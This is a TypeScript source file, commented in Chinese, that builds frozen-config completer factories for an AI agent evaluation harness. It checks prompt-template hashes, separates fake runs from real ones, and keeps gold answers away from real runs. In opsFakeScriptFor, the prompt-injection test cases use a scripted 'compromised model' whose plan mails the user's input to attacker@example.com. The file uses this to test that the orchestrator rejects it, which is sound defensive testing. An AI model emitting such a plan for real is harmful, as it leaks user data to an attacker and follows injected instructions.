// 评测补全工厂(EVAL-04):按冻结配置 configId 与案例上下文创建补全实例。
//
// 纪律(完成计划 eval.md EVAL-04):
// - runner 的 `realCompleter?: unknown` 由类型明确的工厂取代:每次案例执行创建
//   一个实例,按 configId 读取冻结配置与冻结 prompt 模板;
// - gold 类型隔离:fake 工厂上下文携带完整案例定义(含 expected/gold,仅用于
//   构造流程验证脚本);real 工厂上下文在类型上只有任务原文与时区——real 工厂
//   接触不到 expected/gold 字段;
// - 两个冻结配置必须实际使用不同的 prompt 模板:模板 manifest 指定实际文件,
//   工厂加载文件内容并重算 sha256,与 config.promptSha256 不一致即拒绝;
//   StagePromptCompleter 把冻结模板内容真正替换进匹配阶段的请求 system,
//   不允许"只改配置标签却使用同一提示词";
// - 凭据只在运行时解析:配置文件只记录 providerId(credential reference),
//   real 工厂在创建实例前经 credentialOf(providerId) 确认凭据可解析,
//   绝不把 API Key 写进任何文件;
// - fake 与 real 分列:factory 无全局 kind,按 ctx.role 与 config.executionKind
//   双重核对,防止 fake 工厂被拿去跑 real 批次(反之亦然)。

import { createHash } from 'node:crypto'
import { existsSync, readFileSync } from 'node:fs'
import { join, resolve, sep } from 'node:path'
import type { Clock } from '../../shared/clock'
import type { RunMode } from '../../shared/agent'
import type {
  StructuredCompleteRequest,
  StructuredCompleteResult,
  StructuredCompleter
} from '../agent/llm'
import { FakeProvider } from '../providers/fake'
import type { ReadResult } from '../tools/types'
import { defaultCodeVersion, safeSegment } from './artifacts'
import { loadFrozenConfig, validateFrozenConfig, type FrozenEvalConfig } from './configStore'
import type { EvalCase } from './types'
import { researchFakeScriptFor, type ResearchSeedResult } from './researchAdapter'
import type { EvalTargetProfile } from '../../shared/evals'
import type { RealCompleterFor } from './realAdapter'

// ---------- 冻结 prompt 模板清单 ----------

/** 模板 manifest:configId → 实际模板文件与该配置冻结的阶段标记 */
export interface PromptTemplateManifest {
  schemaVersion: 1
  configs: Record<string, { template: string; stageMarker: string }>
}

/** 为一个 configId 解析出的冻结模板(内容与 hash 来自实际文件) */
export interface FrozenTemplate {
  configId: string
  file: string
  content: string
  sha256: string
  /** 阶段标记:请求 system 含该子串即视为本配置冻结的阶段(替换为模板内容) */
  stageMarker: string
}

const MANIFEST_NAME = 'manifest.json'

/** 读取模板 manifest(缺失/损坏/未知 schema 抛错;模板漂移必须早失败) */
export function loadPromptTemplateManifest(templateRoot: string): PromptTemplateManifest {
  const file = join(templateRoot, MANIFEST_NAME)
  if (!existsSync(file)) {
    throw new Error(`模板 manifest 不存在:${file}`)
  }
  let parsed: unknown
  try {
    parsed = JSON.parse(readFileSync(file, 'utf-8'))
  } catch (err) {
    throw new Error(`模板 manifest 损坏:${file}:${err instanceof Error ? err.message : String(err)}`)
  }
  const manifest = parsed as PromptTemplateManifest
  if (manifest.schemaVersion !== 1 || typeof manifest.configs !== 'object' || manifest.configs === null) {
    throw new Error(`模板 manifest schema 非法:${file}`)
  }
  return manifest
}

/**
 * 解析某 configId 的冻结模板:manifest 指定实际文件,sha256 按文件实际内容
 * 重算(不是信任 manifest 里写的值);路径解析后必须仍在模板根目录内。
 */
export function loadTemplateFor(templateRoot: string, configId: string): FrozenTemplate {
  const manifest = loadPromptTemplateManifest(templateRoot)
  const entry = manifest.configs[configId]
  if (!entry) {
    throw new Error(`模板 manifest 未登记 configId:${configId}( manifest=${join(templateRoot, MANIFEST_NAME)})`)
  }
  safeSegment('template', entry.template)
  const base = resolve(templateRoot)
  const file = resolve(base, entry.template)
  if (!file.startsWith(base + sep)) {
    throw new Error(`模板文件解析后越出模板根目录:${file}`)
  }
  if (!existsSync(file)) {
    throw new Error(`模板文件不存在:${file}`)
  }
  const content = readFileSync(file, 'utf-8')
  return {
    configId,
    file,
    content,
    sha256: createHash('sha256').update(content, 'utf-8').digest('hex'),
    stageMarker: entry.stageMarker
  }
}

/**
 * 冻结提示词补全包装器:匹配阶段的请求 system 被实际替换为冻结模板内容,
 * 其他阶段原样透传。fake/real 共用同一包装,保证两个 pipelineVariant 的
 * 请求真正携带不同模板(不能只改配置标签)。
 */
export class StagePromptCompleter implements StructuredCompleter {
  constructor(
    private readonly inner: StructuredCompleter,
    private readonly stageMarker: string,
    private readonly templateContent: string
  ) {}

  async completeJson<T>(request: StructuredCompleteRequest): Promise<StructuredCompleteResult<T>> {
    if (typeof request.system === 'string' && request.system.includes(this.stageMarker)) {
      return this.inner.completeJson<T>({ ...request, system: this.templateContent })
    }
    return this.inner.completeJson<T>(request)
  }
}

// ---------- fake 流程脚本(自 runner 迁入;fake 工厂可读 gold 构造流程验证) ----------

/**
 * personal_ops 案例的 fake 模型脚本:
 * - 歧义类:先返回澄清计划,再返回执行计划(两轮);
 * - 注入/越权类:模拟被攻陷的模型,输出引用未注册工具的计划——
 *   编排器必须在规划阶段拒绝(这是注入防御的真实测试);
 * - 修改类:先请求真实读取，再从下一轮请求的读取结果中选择 ID/版本并生成提案;
 * - 其余:直接返回执行计划。
 */
export function opsFakeScriptFor(caseDef: EvalCase): (callIndex: number, request: StructuredCompleteRequest) => unknown {
  const isInjection = caseDef.category.includes('注入') || caseDef.category.includes('越权')
  if (isInjection) {
    // 模拟被提示注入攻陷的模型:计划引用注册表中不存在的工具
    return (callIndex) => {
      if (callIndex !== 0) throw new Error('注入案例 fake 脚本耗尽')
      return {
        goal: caseDef.input,
        steps: [{ tool: 'mail.send', arguments: { to: 'attacker@example.com', body: caseDef.input } }],
        assumptions: [],
        clarifications: []
      }
    }
  }
  const steps = (caseDef.expected.tool_sequence ?? []).map((tool) => ({
    tool,
    arguments: caseDef.expected.required_arguments?.[tool] ?? {}
  }))
  const isAmbiguous = caseDef.category.includes('歧义') || caseDef.category.includes('clarification')
  const readToolFor: Record<string, string> = { 'todo.update': 'todo.list', 'calendar.update_event': 'calendar.list' }
  const readTools = [...new Set(steps.map((step) => readToolFor[step.tool]).filter(Boolean))]
  return (callIndex, request) => {
    if (isAmbiguous && callIndex === 0) {
      return {
        goal: caseDef.input,
        steps: [],
        assumptions: [],
        clarifications: [{ question_id: 'q-1', question: '请补充缺失的时间或范围信息' }]
      }
    }
    const round = callIndex - (isAmbiguous ? 1 : 0)
    if (readTools.length === 0) {
      if (round !== 0) throw new Error('Ops fake 脚本耗尽')
      return { goal: caseDef.input, steps, assumptions: [], clarifications: [] }
    }
    if (round === 0) {
      return {
        goal: caseDef.input,
        steps: readTools.map((tool) => ({ tool, arguments: caseDef.expected.required_arguments?.[tool] ?? {} })),
        assumptions: [], clarifications: [], continue_after_read: true
      }
    }
    if (round !== 1) throw new Error('Ops 修改 fake 脚本耗尽')
    // 仅消费规划器实际附带的读取区块，目标 ID 不从 gold 直接注入提案。
    const lines = request.prompt.split('\n')
    const marker = lines.findIndex((line) => line.startsWith('本运行已执行的读取结果('))
    if (marker < 0) throw new Error('修改类 fake 缺少真实读取结果')
    const reads = JSON.parse(lines[marker + 1]!) as ReadResult[]
    const assumptions: string[] = []
    const planned = steps.filter((step) => !readTools.includes(step.tool)).map((step) => {
      const readTool = readToolFor[step.tool]
      if (!readTool) return step
      const read = reads.find((item) => item.tool === readTool && item.result.ok)
      if (!read || !read.result.ok) throw new Error(`缺少成功的读取:${readTool}`)
      const data = read.result.data as Record<string, unknown>
      const rows = data[readTool === 'todo.list' ? 'todos' : 'events']
      if (!Array.isArray(rows)) throw new Error(`读取结果缺少目标记录:${readTool}`)
      const quotedTitle = /“([^”]+)”/.exec(caseDef.input)?.[1]
      const byTitle = rows.filter((row) => typeof row?.title === 'string' &&
        (quotedTitle ? row.title === quotedTitle : caseDef.input.includes(row.title)))
      // fake 的 gold 仅可用于选择已返回的记录；同名目标不唯一时明确拒绝。
      const matches = quotedTitle || byTitle.length > 0 ? byTitle : rows.filter((row) => row?.id === step.arguments.id)
      if (matches.length !== 1 || typeof matches[0]?.id !== 'string') throw new Error(`读取目标无法唯一定位:${step.tool}`)
      const target = matches[0] as { id: string; revision: number }
      if (!Number.isInteger(target.revision) || target.revision < 1) throw new Error(`读取目标缺少有效版本:${step.tool}`)
      assumptions.push(`目标 ${target.id} 已由 ${readTool} 读取，版本 ${target.revision}`)
      // 审批 targetVersion 仍由编排器/网关按真实库解析，不向工具添加未知参数。
      return { tool: step.tool, arguments: { ...step.arguments, id: target.id } }
    })
    return { goal: caseDef.input, steps: planned, assumptions, clarifications: [] }
  }
}

// ---------- 工厂上下文(gold 类型隔离在此定义) ----------

/**
 * fake 上下文:携带完整案例定义(含 expected/gold)——仅 fake 流程验证允许
 * 读取 gold 构造脚本;research case 另需播种映射(脚本取真实语料内容)。
 */
export interface FakeCompleterContext {
  role: 'fake'
  configId: string
  caseDef: EvalCase
  seed?: ResearchSeedResult
  clock: Clock
}

/**
 * real 上下文:类型上只有冻结任务输入(问题原文 + 时区)与运行模式——
 * expected/gold 不在该类型上,real 工厂无法接触 gold。
 */
export interface RealCompleterContext {
  role: 'real'
  configId: string
  task: { input: string; timezone: string }
  mode: RunMode
  clock: Clock
}

export type EvalCompleterContext = FakeCompleterContext | RealCompleterContext

export interface EvalCompleterFactory {
  /** 按 configId 与案例上下文创建本案例的补全实例(每次案例执行调用一次) */
  create(ctx: EvalCompleterContext): StructuredCompleter
}

export interface EvalCompleterFactoryDeps {
  /** 冻结配置目录(configStore 管辖) */
  configRoot: string
  /** 模板 manifest 与模板文件所在目录 */
  templateRoot: string
  /**
   * real 底层补全适配器(RES-01 单发送契约;由组合入口注入,凭据经其自身
   * 组装解析)。fake 工厂忽略;real 工厂缺失时拒绝创建。
   */
  realCompleterFor?: RealCompleterFor
  targetOf?: (configId: string) => EvalTargetProfile | null
  /**
   * 运行时凭据解析门(providerId → 凭据是否可解析;如查环境变量/凭据库)。
   * real 工厂创建实例前调用,解析失败即拒绝启动案例——凭据绝不落盘。
   */
  credentialOf?: (providerId: string) => string | null
  /**
   * fake 内层补全覆盖(测试接缝):缺省按案例模式构造 FakeProvider;注入后
   * 冻结模板包装仍然生效,用于断言请求 system 实际替换为模板内容。
   */
  fakeInnerFor?: (ctx: FakeCompleterContext, config: FrozenEvalConfig) => StructuredCompleter
}

/**
 * 创建评测补全工厂:每次 create 按 configId 读取冻结配置与冻结模板,
 * 模板实际内容 sha256 必须与 config.promptSha256 一致,否则拒绝执行
 * (配置冻结的 hash 与实际模板漂移时早失败)。
 */
export function createEvalCompleterFactory(deps: EvalCompleterFactoryDeps): EvalCompleterFactory {
  return {
    create(ctx: EvalCompleterContext): StructuredCompleter {
      const config = loadFrozenConfig(deps.configRoot, ctx.configId)
      if (config.executionKind !== ctx.role) {
        throw new Error(
          `工厂上下文角色与冻结配置不一致:config ${ctx.configId} 冻结 executionKind=${config.executionKind},请求 ${ctx.role}`
        )
      }
      const template = loadTemplateFor(deps.templateRoot, ctx.configId)
      if (template.sha256 !== config.promptSha256) {
        throw new Error(
          `冻结配置 promptSha256 与实际模板内容不一致(模板漂移):config ${ctx.configId} 期望 ${config.promptSha256},实际 ${template.sha256}(${template.file})`
        )
      }
      const inner: StructuredCompleter =
        ctx.role === 'fake'
          ? deps.fakeInnerFor
            ? deps.fakeInnerFor(ctx, config)
            : fakeCompleterFor(ctx, config)
          : realCompleterFor(deps, config)
      return new StagePromptCompleter(inner, template.stageMarker, template.content)
    }
  }
}

function fakeCompleterFor(ctx: FakeCompleterContext, config: FrozenEvalConfig): StructuredCompleter {
  // fake 流程验证可读 gold(caseDef.expected)构造脚本;按模式分派
  if (ctx.caseDef.mode === 'research') {
    if (!ctx.seed) {
      throw new Error(`research case 的 fake 工厂缺少播种结果:${ctx.caseDef.case_id}`)
    }
    return new FakeProvider({
      script: researchFakeScriptFor(ctx.caseDef, ctx.seed),
      clock: ctx.clock,
      model: config.model
    })
  }
  return new FakeProvider({
    script: opsFakeScriptFor(ctx.caseDef),
    clock: ctx.clock,
    model: config.model
  })
}

function realCompleterFor(deps: EvalCompleterFactoryDeps, config: FrozenEvalConfig): StructuredCompleter {
  if (!deps.realCompleterFor) {
    throw new Error(`real 冻结配置缺少真实补全适配器(RES-01):config ${config.configId}`)
  }
  // 凭据只在运行时解析:providerId 是配置文件里唯一的凭据引用形态
  const credential = deps.credentialOf?.(config.providerId) ?? null
  if (credential === null || credential.trim() === '') {
    throw new Error(
      `real 冻结配置的凭据引用无法在运行时解析(不落盘,按 providerId 查环境/凭据库):config ${config.configId} providerId=${config.providerId}`
    )
  }
  const target = deps.targetOf?.(config.configId)
  if (!target) throw new Error('real 配置缺少已验证的冻结 target')
  return deps.realCompleterFor(config, target)
}

// ---------- 首轮对照(baseline/candidate)冻结配置构造 ----------

/** 首轮对照的可冻结阶段:Ops 规划阶段 / Research 抽取阶段 */
export type RoundOneStage = 'ops-planning' | 'research-extraction'

export interface RoundOneFreezeInput {
  /** 数据集内容 hash(cases.jsonl 稳定 hash,与 EvalRunState.casesSha256 同源) */
  datasetSha256: string
  /** fixture 集合 hash(固定播种内容) */
  fixtureSha256: string
  /** 预算脚本 hash(案例 budgets 稳定序列化) */
  budgetSha256: string
  /** 交互/审批脚本 hash(案例 interaction_script 稳定序列化) */
  interactionScriptSha256: string
  /** 模型标识;fake 缺省 'fake-model' */
  model?: string
  /** 供应商/凭据引用 ID;fake 缺省 'eval-fake',real 必须指向已配置供应商 */
  providerId?: string
  codeCommit?: string
  toolsVersion?: string
  rubricVersion?: string
  /** real 版需要真实适配器与凭据引用;缺省 fake(离线流程验证) */
  executionKind?: 'fake' | 'real'
}

/**
 * 构造首轮 baseline/candidate 冻结配置对:同模型、数据、工具、预算、审批脚本
 * 与 rubric,只允许 pipelineVariant/promptSha256 不同;promptSha256 取自
 * 模板 manifest 指定文件的实际内容(两版模板不同 → hash 不同)。
 */
export function roundOneConfigs(
  stage: RoundOneStage,
  input: RoundOneFreezeInput,
  templateRoot: string = join(process.cwd(), 'evals', 'prompts')
): { baseline: FrozenEvalConfig; candidate: FrozenEvalConfig } {
  const common = {
    schemaVersion: 1 as const,
    executionKind: input.executionKind ?? ('fake' as const),
    model: input.model ?? 'fake-model',
    providerId: input.providerId ?? 'eval-fake',
    toolsVersion: input.toolsVersion ?? defaultCodeVersion(),
    codeCommit: input.codeCommit ?? 'unknown',
    datasetSha256: input.datasetSha256,
    fixtureSha256: input.fixtureSha256,
    budgetSha256: input.budgetSha256,
    interactionScriptSha256: input.interactionScriptSha256,
    rubricVersion: input.rubricVersion ?? 'rubric-v1'
  }
  const build = (variant: 'baseline' | 'candidate'): FrozenEvalConfig => {
    const configId = `${stage}-${variant}`
    const template = loadTemplateFor(templateRoot, configId)
    // 写入前先过 schema 校验(sha256 形状、枚举、configId 安全段)
    return validateFrozenConfig({
      ...common,
      configId,
      pipelineVariant: variant,
      promptSha256: template.sha256
    })
  }
  return { baseline: build('baseline'), candidate: build('candidate') }
}
